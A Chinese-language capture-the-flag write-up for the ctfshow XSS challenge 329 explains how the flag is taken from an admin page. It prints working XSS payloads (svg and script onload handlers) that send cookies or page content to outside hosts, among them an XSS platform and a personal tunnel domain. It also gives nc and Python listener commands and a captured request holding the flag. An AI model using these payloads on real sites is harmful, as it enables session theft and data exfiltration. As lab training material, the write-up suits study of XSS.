# ctfshow-xss329



##### 参考链接

其他大佬链接

feng  https://ego00.blog.csdn.net/article/details/114079028

Y4	 https://blog.csdn.net/solitudi/article/details/111568030?spm=1001.2014.3001.5501

bit   https://www.xl-bit.cn/index.php/archives/120/



```
欢迎你登陆ctfshow

用户名
请输入用户名
密码
请输入密码
密码必须大于6位

```

```html
既然前面是反射型xss  其实不管它是反射还是存储 
主要还是需要我们利用xss平台 获取cookie


xss平台
https://ww.rs/
https://hk.sb/


输入框输入
<Img sRC=//hk.sb/UfVb/test.jpg>

后面用了buu的公开靶机当个nc监听的服务器
nc -lvp 1104
正常的vps那边是需要nc的，但是nc好像不能持续接收，但是方法其实很多，可以重复起nc，或者我这边就临时拿python起一个临时的服务器，接收一下get参数：
python -m http.server 1104
<svg/onload="window.open('https://hk.sb/y7xx'+document.cookie)">
<body/onload="window.open('https://hk.sb/y7xx'+document.cookie)">

<svg/onload="window.open('http://node4.buuoj.cn:1104/'+document.cookie)">
    <svg	onload="window.open('http://3e8366a0-4e63-4eec-963d-6fa92cad126e.node4.buuoj.cn:1104/'+document.cookie)">
     
 
 直接拿到管理员的cookie也没法成功登录。由于设置了cookie发给你后就让他失效，所以没法登录成admin。
但是可以想办法把那个页面的内容给直接读到
 
 先注册
 用户名  ruiwen
 密码		<script>window.open('http://mi45179676.zicp.vip/'+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>
 重复密码	<script>window.open('http://mi45179676.zicp.vip/'+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>
 
innerHTML和outerHTML的区别
1）innerHTML:
　　从对象的起始位置到终止位置的全部内容,不包括Html标签。
2）outerHTML:
　　除了包含innerHTML的全部内容外, 还包含对象标签本身。

输入之后直接就get到了请求
        
GET /ctfshow%7B4c811195-9769-44c2-b791-5e32ebfe39c8%7D HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://127.0.0.1/manager.php
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: mi45179676.zicp.vip
  

ctfshow{4c811195-9769-44c2-b791-5e32ebfe39c8}

    
        
也可以找到密码那一栏
元素右键copy jspath
document.querySelector("#top > div.layui-container > div:nth-child(4) > div > div.layui-table-box > div.layui-table-body.layui-table-main > table > tbody > tr:nth-child(2) > td:nth-child(2) > div")

        
        
        
<script>window.open('http://mi45179676.zicp.vip/'+document.querySelector("#top > div.layui-container > div:nth-child(4) > div > div.layui-table-box > div.layui-table-body.layui-table-main > table > tbody > tr:nth-child(2) > td:nth-child(2) > div"))</script>        
        

document.querySelector('#top > div.layui-container').textContent
```

